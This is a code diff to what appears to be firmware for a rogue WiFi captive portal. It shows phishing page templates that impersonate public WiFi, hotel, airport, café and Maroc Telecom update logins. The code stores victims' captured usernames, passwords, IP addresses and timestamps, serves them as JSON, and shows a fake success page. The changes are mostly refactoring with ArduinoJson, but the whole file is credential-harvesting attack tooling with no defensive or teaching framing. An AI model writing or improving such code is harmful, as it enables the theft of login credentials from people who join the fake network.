@@ -1,16 +1,17 @@
 #include "hardware.h"
 #include "captive_portal.h"
+#include <ArduinoJson.h>
 
 CapturedCred capturedCreds[MAX_CAPTURED_CREDS];
 int capturedCount = 0;
 bool portalActive = false;
 
 PortalStyle portalStyles[] = {
-  {"wifi_login",  "WiFi Login",         "Connectez-vous au réseau",  "📶", "#2563eb", "linear-gradient(135deg,#1e40af,#3b82f6)", "Email / Téléphone", "Mot de passe", "WiFi-Free"},
-  {"hotel",      "Hôtel WiFi",         "Accès Internet",            "🏨", "#059669", "linear-gradient(135deg,#065f46,#10b981)", "Numéro de chambre", "Nom complet", "Hotel_WiFi"},
-  {"isp_update", "Mise à jour opérateur","Configuration requise",     "🔧", "#d97706", "linear-gradient(135deg,#92400e,#f59e0b)", "Identifiant", "Mot de passe", "MarocTelecom_Update"},
-  {"airport",    "Aéroport WiFi",      "Connexion gratuite",         "✈️", "#7c3aed", "linear-gradient(135deg,#5b21b6,#8b5cf6)", "Email", "Numéro vol", "Airport_Free"},
-  {"cafe",       "Café WiFi",         "Connexion gratuite",         "☕", "#ea580c", "linear-gradient(135deg,#9a3412,#f97316)", "Email", "Téléphone", "Cafe_Free"}
+  {"wifi_login", "WiFi Login",         "Connectez-vous au reseau",  "\xF0\x9F\x93\xB6", "#2563eb", "linear-gradient(135deg,#1e40af,#3b82f6)", "Email / Telephone", "Mot de passe", "WiFi-Free"},
+  {"hotel",      "Hotel WiFi",         "Acces Internet",            "\xF0\x9F\x8F\xA8", "#059669", "linear-gradient(135deg,#065f46,#10b981)", "Numero de chambre", "Nom complet", "Hotel_WiFi"},
+  {"isp_update", "Mise a jour operateur","Configuration requise",   "\xF0\x9F\x94\xA7", "#d97706", "linear-gradient(135deg,#92400e,#f59e0b)", "Identifiant", "Mot de passe", "MarocTelecom_Update"},
+  {"airport",    "Aeroport WiFi",      "Connexion gratuite",        "\xE2\x9C\x88\xEF\xB8\x8F", "#7c3aed", "linear-gradient(135deg,#5b21b6,#8b5cf6)", "Email", "Numero de vol", "Airport_Free"},
+  {"cafe",       "Cafe WiFi",          "Connexion gratuite",        "\xE2\x98\x95", "#ea580c", "linear-gradient(135deg,#9a3412,#f97316)", "Email", "Telephone", "Cafe_Free"}
 };
 const int NUM_PORTAL_STYLES = 5;
 
@@ -20,6 +21,7 @@ void initCaptivePortal() {
 }
 
 void startCaptivePortal(int templateIdx, const char* customSSID) {
+  if (templateIdx < 0 || templateIdx >= NUM_PORTAL_STYLES) templateIdx = 0;
   portalActive = true;
   capturedCount = 0;
 }
@@ -33,35 +35,43 @@ void clearCreds() {
 }
 
 String getPortalStatusJSON() {
-  return "{\"active\":" + String(portalActive ? "true" : "false") +
-         ",\"captured\":" + String(capturedCount) + "}";
+  JsonDocument doc;
+  doc["active"] = portalActive;
+  doc["captured"] = capturedCount;
+  String out;
+  serializeJson(doc, out);
+  return out;
 }
 
 String getPortalCredsJSON() {
-  String json = "[";
+  JsonDocument doc;
+  JsonArray arr = doc.to<JsonArray>();
   for (int i = 0; i < capturedCount; i++) {
-    if (i) json += ",";
-    json += "{\"user\":\"" + String(capturedCreds[i].username) + "\",";
-    json += "\"pass\":\"" + String(capturedCreds[i].password) + "\",";
-    json += "\"ip\":\"" + String(capturedCreds[i].ip) + "\"}";
+    JsonObject obj = arr.add<JsonObject>();
+    obj["user"] = capturedCreds[i].username;
+    obj["pass"] = capturedCreds[i].password;
+    obj["ip"] = capturedCreds[i].ip;
+    obj["ts"] = capturedCreds[i].timestamp;
   }
-  json += "]";
-  return json;
+  String out;
+  serializeJson(doc, out);
+  return out;
 }
 
 String getPortalTemplatesJSON() {
-  String json = "[";
+  JsonDocument doc;
+  JsonArray arr = doc.to<JsonArray>();
   for (int i = 0; i < NUM_PORTAL_STYLES; i++) {
-    if (i) json += ",";
-    json += "{\"id\":\"" + String(portalStyles[i].id) + "\",";
-    json += "\"title\":\"" + String(portalStyles[i].title) + "\"}";
+    JsonObject obj = arr.add<JsonObject>();
+    obj["id"] = portalStyles[i].id;
+    obj["title"] = portalStyles[i].title;
   }
-  json += "]";
-  return json;
+  String out;
+  serializeJson(doc, out);
+  return out;
 }
 
 String generatePortalHTML(int templateIdx) {
-  // Simplified — full template would be in PROGMEM
   if (templateIdx < 0 || templateIdx >= NUM_PORTAL_STYLES) templateIdx = 0;
   PortalStyle &s = portalStyles[templateIdx];
   String html = "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>";
@@ -86,5 +96,5 @@ String generatePortalHTML(int templateIdx) {
 }
 
 String generateSuccessHTML() {
-  return "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'><style>body{font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f5}.msg{text-align:center}h2{color:#16a34a;font-size:1.5rem}p{color:#6e6e73}</style></head><body><div class=msg><h2>✓ Connexion réussie</h2><p>Vous êtes maintenant connecté</p></div></body></html>";
+  return "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'><style>body{font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f5}.msg{text-align:center}h2{color:#16a34a;font-size:1.5rem}p{color:#6e6e73}</style></head><body><div class=msg><h2>\xE2\x9C\x93 Connexion reussie</h2><p>Vous etes maintenant connecte</p></div></body></html>";
 }
